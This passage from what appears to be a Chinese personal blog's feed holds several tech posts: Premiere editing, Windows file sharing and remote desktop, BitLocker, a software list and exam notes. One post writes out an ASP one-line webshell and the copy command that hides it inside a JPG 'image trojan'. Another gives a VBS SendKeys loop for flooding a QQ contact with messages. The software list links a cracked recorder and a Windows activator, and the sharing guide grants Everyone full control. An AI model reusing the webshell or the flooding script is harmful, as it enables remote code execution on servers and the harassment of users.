alt=""></p></li><li><p>添加标记（快捷键M）：相当于<strong>备忘录</strong>，可以打个标记提醒自己后期修改； 双击添加的指标就可以进行命名，，，选中素材的话会标记素材，不选任何素材的话就直接标记在时间轴上。<strong>清除：</strong>选中标记右键清除即可<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003603.png" alt=""></p></li><li><p>扳手按钮：有很多显示选项，相当于一个集成管理面板，一般不去修改它。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003641.png" alt=""></p></li><li><p>V1/A1：点亮V1的话表示只拖入视频，点亮A1的话表示只拖入音频。<strong>决定的是你的素材拖进来是否是有视频或者音频的一个开关。</strong></p><p>从左往右数第三个按钮是决定视频优先级的。也可以进行点亮或者关闭。<strong>全部点亮</strong>的话<strong>1的优先级最高</strong>依次往后。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003706.png" alt=""></p></li><li><p>小锁图标：表示锁定这一层，无法在进行任何修改。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003733.png" alt=""></p></li><li><p>眼睛图标：控制视频的显示或者隐藏。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003755.png" alt=""></p></li><li><p>M图标：控制音频的播放或者禁止。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003809.png" alt=""></p></li><li><p>独奏轨道：只有对应轨道发声。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003826.png" alt=""></p></li></ul></li></ul></li></ul><h4 id="最常用的两个工具："><a href="#最常用的两个工具：" class="headerlink" title="最常用的两个工具："></a><strong>最常用的两个工具：</strong></h4><p><strong>选择工具快捷键是V：</strong>选中视频、音频素材进行编辑。</p><p><strong>剃刀工具快捷键是C：</strong>可以对视频或者音频素材随意进行切割；；；；我喜欢叫它菜刀工具哈哈哈哈哈。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003844.png" alt=""></p><h5 id="六、效果控件面板："><a href="#六、效果控件面板：" class="headerlink" title="六、效果控件面板："></a>六、效果控件面板：</h5><p>找不到某一个面板的话，菜单栏-窗口里找到点击它，面板就会自动跳出来。</p><p>面板默认展开功能：</p><ul><li><p>运动：</p><ul><li><p>位置属性</p></li><li><p>缩放属性</p></li><li><p>缩放宽度，默认是等比缩放。</p></li><li><p>旋转</p></li><li><p>描点</p></li><li><p>防闪烁滤镜</p></li></ul></li></ul><p>可以吧效果面板里的一些功能添加到效果控件里面。</p><p>效果控件顾名思义：就是控制效果的属性。</p><ul><li><p>不透明度</p></li><li><p>时间重映射<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003914.png" alt=""></p></li></ul><p>可以随便调，调坏了可以点击右边的重置按钮进行重置。</p><h5 id="七、效果面板"><a href="#七、效果面板" class="headerlink" title="七、效果面板"></a>七、效果面板</h5><p>里面有很多的特效可以使用。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003951.png" alt=""></p><p>这里我用 <strong>交叉溶解：</strong>让两个相片之间过渡不生硬。</p><blockquote><p>批量添加转场的方法：</p><p>1、选中自己想要的效果右击，设置为默认过渡。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316004032.png" alt=""></p><p>2、框选需要添加的素材<strong>CTRL + D</strong> 。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316004308.png" alt=""></p><p>3、这个时候 每一个图片之间都有一个交叉溶解的效果。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316004332.png" alt=""></p></blockquote><p>调整转场效果时长：双击转场效果，修改持续时间即可控制转场特效的长短。</p><p>批量改的方法：回到菜单栏-编辑- 首选项-时间轴-<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316004405.png" alt="">)视频过渡默认持续时间，<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316004406.png" alt="">修改数值点击确定，在框选素材 CTRL + D就可以修改全部转场效果的时间。</p><h5 id="八、制作相框效果"><a href="#八、制作相框效果" class="headerlink" title="八、制作相框效果"></a>八、制作相框效果</h5><p>1、复制素材：</p><ul><li><p>选中素材 按住Alt 鼠标将其拖至其它位置即可复制。<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316004722.png" alt=""></p></li><li><p>CTRL C CTRL V</p></li></ul><p>2、选中上方一层的图片，将缩放设置70%左右</p><blockquote><p>3、添加效果 <strong>径向阴影</strong></p><p>操作步骤如下：</p><ul><li><p>效果-视频效果-透视-径向阴影；将它拉到上方一层素材图片上。</p></li><li><p>效果控件，勾选最后一个<strong>调整图层大小</strong> 。</p></li><li><p>阴影颜色-点击黑色的色块将颜色改为白色。</p></li><li><p>不透明度100%</p></li><li><p>光源x轴1000 y轴530</p></li><li><p>投影距离5</p></li></ul></blockquote><p>4、添加效果 投影</p><p>视频效果-透视-投影（可以直接搜索）</p><p>将它拖到最上面的一层素材上，回到<strong>效果控件</strong> ；；主要调整一下<strong>距离</strong>位30左右（根据实际情况修改），，<strong>不透明度</strong>适当调整为80%左右，，添加<strong>柔和度</strong>15让阴影边缘不要那么硬。</p><p>5、背景添加高斯模糊的效果</p><ul><li><p>搜索 <strong>高斯模糊</strong> 将效果拖到下面的图片上</p></li><li><p>设置一下<strong>高斯模糊</strong>的<strong>模糊度</strong> 50</p></li></ul><blockquote><p>使用批量化添加效果：</p><p>选中做好效果的素材右击复制，框选其它没有效果的素材右键粘贴属性，即可使选中的素材全部应用已做好的效果。（弹出对话框全部都勾选哈哈哈哈哈哈哈）</p><p>下方图层：用快捷键，CTRL C复制效果，选中没有效果的素材按住shift键可以加减选区，CTRL Alt V调出粘贴属性的面板点击确定。</p></blockquote><p>6、修改效果为 立方体旋转</p><ul><li><p>视频过渡-3D效果-立方体旋转；；拖到两个素材之间</p><h2 id="批量添加过渡"><a href="#批量添加过渡" class="headerlink" title="批量添加过渡"></a>批量添加过渡</h2></li></ul><p>选中 立方体旋转 右键设置为默认过渡 框选所有的素材 CtRL D批量添加上过渡效果。</p><p>7、添加效果：光晕效果</p><p><strong>导</strong>入光晕效果素材并<strong>拖</strong>入到时间轴，效果控件中修改不透明度-混合模式滤色。</p><p>处理尾巴：选择剃刀，按住shift键点击时间点，，这个时间点所有的素材都会被砍断。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 平面设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平面设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows局域网共享文件/远程控制</title>
      <link href="/posts/60536.html"/>
      <url>/posts/60536.html</url>
      
        <content type="html"><![CDATA[<h1 id="局域网共享文件夹："><a href="#局域网共享文件夹：" class="headerlink" title="局域网共享文件夹："></a>局域网共享文件夹：</h1><p>1、首先在你想要共享的文件夹或者磁盘，选中单击右键  -授予访问权限-高级共享 ；如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200306094852.png" alt=""></p><p>2、点击高级共享-共享此文件夹-点击权限（完全控制）-复制用户名Everyone （提升权限需要用到，不然会提示权限不足或者其它报错）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200306094851.png" alt=""></p><p>3、点击安全-Authenticated Users-编辑-选中Authenticated Users 添加用户Everyone，；勾选完全权限，确认即可。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200306094850.png" alt=""></p><p>这是会看到多了一个Everyone用户，给他完全权限。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200306094853.png" alt=""></p><p>4、查看网络路径，Ctrl R 输入路径 访问即可。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200306094849.png" alt=""></p><p>也可以使用<code>Bat脚本</code>一建打开共享文件夹：</p><p>代码如下：</p><pre class=" language-batch"><code class="language-batch"><span class="token command"><span class="token keyword">explorer</span> \\Cat00011cat\e</span></code></pre><h1 id="局域网远程桌面："><a href="#局域网远程桌面：" class="headerlink" title="局域网远程桌面："></a>局域网远程桌面：</h1><p>1、首先打开控制面板-系统-远程控制；</p><p>远程协助：允许远程协助连接此计算机</p><p>远程桌面：允许远程连接至此计算机</p><p>接着 ctrl r /cmd命令下    输入<code>netplwiz</code>   查看用户。</p><p>如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200306100020.png" alt=""></p><p>2、远程连接</p><p>在需要被远程的机子上cmd窗口执行<code>ipconfig</code>查看本机ip，用于连接。如下图</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200306101029.png" alt=""></p><p>输入ip:8080 进行连接</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200306101011.png" alt=""></p><p>输入密码，连接成功。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200306101019.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ轰炸鸡VBS脚本</title>
      <link href="/posts/46205.html"/>
      <url>/posts/46205.html</url>
      
        <content type="html"><![CDATA[<p>本屌话不多说，直接上VBS代码 如下：</p><p>带数字的</p><pre class=" language-visual-basic"><code class="language-visual-basic">Dim WshShellSet WshShell= Wscript.CreateObject("WScript.Shell")WshShell.AppActivate "被怼人昵称"for i=1 to 300WScript.Sleep 100WshShell.SendKeys "^v"WshShell.SendKeys iWshShell.SendKeys "%s"Next</code></pre><p>不带数字的</p><pre class=" language-visual-basic"><code class="language-visual-basic">set wshshell=wscript.createobject("wscript.shell")wshshell.AppActivate"要发送的人的名字"for i=1 to 100wscript.sleep 100wshshell.sendKeys "^v"wshshell.sendKeys "%s"next</code></pre><p>使用方法：</p><p>1、代码复制粘贴到.txt文件，ANSI编码并另存为命名为.vbs结尾</p><p>2、发送消息复制粘贴到消息待发送区域</p><p>3、接着双击，vbs脚本自动循环发送消息</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BitLocker加密Win0硬盘</title>
      <link href="/posts/60728.html"/>
      <url>/posts/60728.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>BitLocker密码及生成秘钥请妥善保管 遗失无法找回。可能导致整个硬盘数据永久无法访问。</strong></p></blockquote><p>此加密方法不会格式化您的数据。同样适用于移动硬盘、U盘等存储设备。</p><h3 id="加密步骤："><a href="#加密步骤：" class="headerlink" title="加密步骤："></a>加密步骤：</h3><p>1、找到你要加密的硬盘，选中右键单击在弹出的菜单选择启用BitLocker加密选项。</p><p>使用密码加密 如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200303160119.png" alt=""></p><p>2、接着选择自己喜欢的秘钥保存方式，将秘钥保存。（妥善保管，丢失后无法访问硬盘。建议上传到云端保存） 如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200303160318.png" alt=""></p><p>3、加密数据需要一段时间，耐心等待即可。 如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200303160547.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200303160546.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200303160545.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PC实用工具</title>
      <link href="/posts/53580.html"/>
      <url>/posts/53580.html</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="前言：整理这个是为了避免自己折腾的时候软件误删之后不能恢复。"><a href="#前言：整理这个是为了避免自己折腾的时候软件误删之后不能恢复。" class="headerlink" title="前言：整理这个是为了避免自己折腾的时候软件误删之后不能恢复。"></a>前言：整理这个是为了避免自己折腾的时候软件误删之后不能恢复。</h3></blockquote><table><thead><tr><th>压缩类</th><th>软件描述</th><th>直通车</th></tr></thead><tbody><tr><td><a href="http://www.bandisoft.com/" target="_blank" rel="noopener">Bandizip</a></td><td>这款工具没有广告，并且支持主流格式，感觉还不错。</td><td><a href="https://www.lanzous.com/b0bq984gf" target="_blank" rel="noopener"> 蓝奏云下载</a></td></tr><tr><td><a href="https://www.7-zip.org/" target="_blank" rel="noopener">7-Zip</a></td><td>体积小、功能强悍。</td><td><a href="https://www.lanzous.com/b0bq984od" target="_blank" rel="noopener">蓝奏云下载</a></td></tr></tbody></table><table><thead><tr><th>搜索类</th><th>软件描述</th><th>直通车</th></tr></thead><tbody><tr><td><a href="https://www.voidtools.com/zh-cn/" target="_blank" rel="noopener">Everything</a></td><td>基于名称快速定位文件和文件夹。它能够迅速找到你电脑里的资源，比微软自带的搜索好用太多了。</td><td><a href="https://www.lanzous.com/b0bq9851g" target="_blank" rel="noopener">蓝奏云下载</a></td></tr></tbody></table><table><thead><tr><th>截图类</th><th>软件描述</th><th>直通车</th></tr></thead><tbody><tr><td>FastStone</td><td>百度就可以知道它的强大了。这里提供一个汉化版本的下载。</td><td><a href="https://www.lanzous.com/b0bq985ej" target="_blank" rel="noopener">蓝奏云下载</a></td></tr></tbody></table><table><thead><tr><th>录屏类</th><th>软件描述</th><th>直通车</th></tr></thead><tbody><tr><td><a href="https://www.bandicam.cn/" target="_blank" rel="noopener">BandiCam</a></td><td>与其他软件相比，用Bandicam录制的视频大小更小，不仅保证原文件的质量。</td><td><a href="https://www.lanzous.com/b0bq989va" target="_blank" rel="noopener">蓝奏云破解版下载</a></td></tr><tr><td><a href="https://www.ieway.cn/" target="_blank" rel="noopener">EV录屏</a></td><td>免费无水印，集视频录制与直播功能于一身的桌面录屏软件，可实现分屏录制、实时按键显示、录屏涂鸦等功能。</td><td><a href="[https://www.ieway.cn/](https://www.ieway.cn/">官网下载</a></td></tr></tbody></table><table><thead><tr><th>下载类</th><th>软件描述</th><th>直通车</th></tr></thead><tbody><tr><td>IDM</td><td>百度一下 你就知道。</td><td><a href="https://www.lanzous.com/b0bq9893c" target="_blank" rel="noopener">蓝奏云下载</a></td></tr><tr><td>WGET</td><td>可以下载HTTP协议的文件，还能批量化。<a href="http://www.thecat.top/posts/undefined.html">使用方法</a></td><td><a href="https://www.lanzous.com/b0bq988ra" target="_blank" rel="noopener">蓝奏云下载</a></td></tr></tbody></table><table><thead><tr><th>图床类</th><th>软件描述</th><th>直通车</th></tr></thead><tbody><tr><td><a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">PicGo</a></td><td>是一个跨平台的程序。可以搭配GitHub+jsDeliver实现无限容量且cdn加速的图床。具体方法👉<a href="http://www.thecat.top/posts/39161.html">直通车</a></td><td><a href="https://www.lanzous.com/b0bq9860b" target="_blank" rel="noopener">蓝奏云下载</a></td></tr></tbody></table><table><thead><tr><th align="left">浏览器类</th><th>软件描述</th><th>直通车</th></tr></thead><tbody><tr><td align="left">Google</td><td>无广告，高端大气上档次，功能强大。</td><td><a href="https://www.google.cn/intl/zh-CN/chrome/" target="_blank" rel="noopener">官网下载</a></td></tr><tr><td align="left">火狐浏览器</td><td>开发人员调试代码友好。</td><td><a href="https://download-ssl.firefox.com.cn/releases-sha2/stub/official/zh-CN/Firefox-latest.exe" target="_blank" rel="noopener">快速下载</a></td></tr></tbody></table><table><thead><tr><th align="left">GIF类</th><th>软件描述</th><th>直通车</th></tr></thead><tbody><tr><td align="left"><a href="https://www.screentogif.com/" target="_blank" rel="noopener">screentogif</a></td><td>录制GIF动图。</td><td><a href="https://www.screentogif.com/" target="_blank" rel="noopener">官网下载</a></td></tr><tr><td align="left"><a href="http://www.bahraniapps.com/" target="_blank" rel="noopener">gifcam</a></td><td>开发人员调试代码友好。</td><td><a href="http://www.bahraniapps.com/" target="_blank" rel="noopener">官网下载</a></td></tr><tr><td align="left"></td><td></td><td><a href="https://www.lanzous.com/b0bq9883g" target="_blank" rel="noopener">蓝奏云下载</a></td></tr></tbody></table><table><thead><tr><th align="left">运维类</th><th>软件描述</th><th>直通车</th></tr></thead><tbody><tr><td align="left">微PE</td><td>免安装即可使用，PE系统纯净无广告。</td><td><a href="http://www.wepe.com.cn/" target="_blank" rel="noopener">官网下载</a></td></tr><tr><td align="left">TOGO</td><td>可以将Windows10系统写入移动存储设备。</td><td><a href="https://www.lanzous.com/b0bq98b6h" target="_blank" rel="noopener">蓝奏云下载</a></td></tr><tr><td align="left">KALI写入U盘</td><td>自动化写入。</td><td><a href="https://www.lanzous.com/b0bq98cbi" target="_blank" rel="noopener">蓝奏云下载</a></td></tr><tr><td align="left">U盘病毒免疫</td><td>可以查杀U盘病毒，写入防毒程序。</td><td><a href="https://www.lanzous.com/b0bq98cgd" target="_blank" rel="noopener">蓝奏云下载</a></td></tr><tr><td align="left">微软云盘套装</td><td>5T超大存储空间，可映射到系统。</td><td><a href="https://www.lanzous.com/b0bq98ctg" target="_blank" rel="noopener">蓝奏云下载</a></td></tr><tr><td align="left">Windows激活</td><td>激活成功率很高。</td><td><a href="https://www.lanzous.com/b0bq98djc" target="_blank" rel="noopener">蓝奏云下载</a></td></tr></tbody></table><table><thead><tr><th align="left">爬虫类</th><th>软件描述</th><th>直通车</th></tr></thead><tbody><tr><td align="left">Teleport Ultra</td><td>能够快速爬取静态网站源码。</td><td><a href="https://www.lanzous.com/b0bq98cob" target="_blank" rel="noopener">蓝奏云下载</a></td></tr></tbody></table><table><thead><tr><th align="left">脚本类</th><th>软件描述</th></tr></thead><tbody><tr><td align="left">批量修改文件后缀名</td><td><a href="https://www.lanzous.com/i9p8r6f" target="_blank" rel="noopener">蓝奏云下载</a></td></tr><tr><td align="left">PC微信多开</td><td><a href="https://www.lanzous.com/i9p8s5a" target="_blank" rel="noopener">蓝奏云下载</a></td></tr><tr><td align="left">一键关机</td><td><a href="https://www.lanzous.com/i9p8tab" target="_blank" rel="noopener">蓝奏云下载</a></td></tr><tr><td align="left">一键ping</td><td><a href="https://www.lanzous.com/i9p8ukh" target="_blank" rel="noopener">蓝奏云下载</a></td></tr></tbody></table><table><thead><tr><th align="left">设计类</th><th>软件描述</th><th></th></tr></thead><tbody><tr><td align="left">SAI</td><td>精悍强大，绘图最佳选择。</td><td><a href="https://www.lanzous.com/b0bq98euj" target="_blank" rel="noopener">蓝奏云下载</a></td></tr></tbody></table><p><strong>最后：</strong> 不要重重复复的做一些事情，别把宝贵的时间花在搜寻软件上；持续更新……</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ps计算机等级考试笔记</title>
      <link href="/posts/48831.html"/>
      <url>/posts/48831.html</url>
      
        <content type="html"><![CDATA[<p>一、<br>计算机等级考试易错题整理：<br>1、20GB的硬盘容量约为？<br>200亿个字节</p><p>2、下列关于ASCII编码的叙述正确的是？<br>所有大写英文字母的ASCII码值都小于小写英文字母’a’的ASCII码值</p><p>3、一个字节为5位的无符号二进制数能表示的十进制数值的范围是？<br>0~31</p><p>4、在下列字符中，其ASCII码最小的一个是？<br>空格字符</p><p>5、十进制数18转换成二进制数是？<br>010010</p><p>6、用助记符代替操作码、地址符号代替操作数的面向机器的语言是？<br>汇编语言</p><p>7、在Photoshop颜色面板中反映的色彩基本属性的是？<br>色相与明度</p><p>8、当图像是索引颜色模式时，无法使用滤镜。</p><p>9、加色系统三原色 红、绿、蓝</p><p>10、选择菜单中修改命令无法提供的功能是？<br>缩放</p><p>11、磁性套索工具选项栏中不影响选取精度的选项是？<br>羽化</p><p>12、能够提供最全面的色彩调整的命令是？<br>曲线</p><p>13、可以完全去除照片的命令是？<br>阈值</p><p>14、可以对图层图像进行对齐和分布的是？<br>链接图层</p><p>15、图层编组描述？<br>两个图层编组后，可以同时移动。</p><p>16、在图层上增加蒙版后，单独移动蒙版的正确操作是？<br>先解除图层与蒙版之间的链接，在选择蒙版，最后使用移动工具。</p><p>二、<br>1、十进制数29转换成无符号二进制数等于？<br>11101</p><p>2、10GB的硬盘表示其存储容量为？<br>一百亿个字节</p><p>3、组成微型机主机的部件是？<br>CPU和内存</p><p>4、已知英文字母m的ASCII码值为6DH，那么字母q的ASCII码值是？<br>71H</p><p>5、一个字节为6位的无符号二进制数能表示的十进制数值范围是？<br>0~63</p><p>6、操作系统对磁盘进行读/写操作的单位是？<br>扇区</p><p>7、一个汉字的国标码需用2字节存储，其每个字节的最高二进制的值分别为？<br>0、0</p><p>8、下列各类计算机程序语言中，不属于高级程序设计语言的是？<br>汇编语言     属于低级语言</p><p>9、在下列字符中，其ASCII码值最大的一个是？<br>A、9<br>B、Z<br>C、d<br>D、X</p><p>正确答案：C      </p><p>10、计算机的主频指的是？<br>时钟频率</p><p>11、属于局域网的是？<br>Novell</p><p>12、在Photoshop中拾色器中表示色彩的纯度属性是？<br>S</p><p>13、色彩位深度是指在一副图像具有 颜色 数量</p><p>14、与设备无关的色彩模式是？<br>Lab</p><p>15、网页上应用的图像其稳健格式应保存为？<br>JPEG</p><p>16、能让图像快速适合屏幕的操作是？<br>双击抓手工具</p><p>17、能快速准确的把包装盒展开图的六个面划分出来的方式是？<br>使用参考线</p><p>18、在Photoshop中，可以准确的控制选区区域的命令是？<br>修改</p><p>19、对图像选区不能进行的操作是？<br>用选区工具移动选区内图像</p><p>20、可用于调整图像偏色的命令是？<br>色彩平衡</p><p>21、调整图像的色彩时，能够保持图像原始色彩信息的方法是应用？<br>调整图层</p><p>22、对背景图层描述错误的是？<br>背景图层上的图像不可被拖放至别的图像文件中</p><p>23、对图层面板中的不透明度描述正确的是？<br>不透明度可以控制普通图层中图像均匀显示的程度</p><p>24、对背景图层可以进行的操作是？<br>转换为普通图层</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片马制作</title>
      <link href="/posts/5813.html"/>
      <url>/posts/5813.html</url>
      
        <content type="html"><![CDATA[<p>我把图片命名为zhf111.jpg</p><p>接下来写一句话木马<br>新建一个zhf111.asp文件，写入一句话木马<br>&lt;%Y=request(“Cat00011cat”)%&gt; &lt;%execute(Y)%&gt;</p><p>然后在win+R，cmd，cd到原始图片的目录路径下</p><p>copy zhf111.jpg/b+zhf111.asp/a zhfmua.jpg</p><p>桌面上出现新的图片就是制作出的图片马</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218021115.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>硬盘故障</title>
      <link href="/posts/48769.html"/>
      <url>/posts/48769.html</url>
      
        <content type="html"><![CDATA[<p>起因，插入硬盘；正常打开我的电脑刷新页面，但是发现硬盘盘符迟迟不显示，？？？？？<br>这个时候，我傻了都，，，昨天还好好的，可不能说没就没了呀几十G资源呢，，<br>于是我不慌的打开控制面板，设备管理器卸载驱动，在刷新驱动，检测驱动，，都不显示盘符，<br>开始慌了<br>（设备可以正常识别）再次傻了都，，，</p><p>解决方案：<br>思路：既然没有盘符，那我们给它整一个不就完美解决了？<br>WIN10系统返回桌面，在桌面按Win+X 打开磁盘管理 如下所示：<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218000804.png" alt=""><br>为硬盘指定一个盘符就行，这里系统会自动指定。不用设置，直接点击添加即可；如下图所示<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218001227.png" alt=""><br>最后回到我的电脑，就会看到硬盘成功显示，<br>嘿嘿嘿，</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速查看端口被谁占用了</title>
      <link href="/posts/30324.html"/>
      <url>/posts/30324.html</url>
      
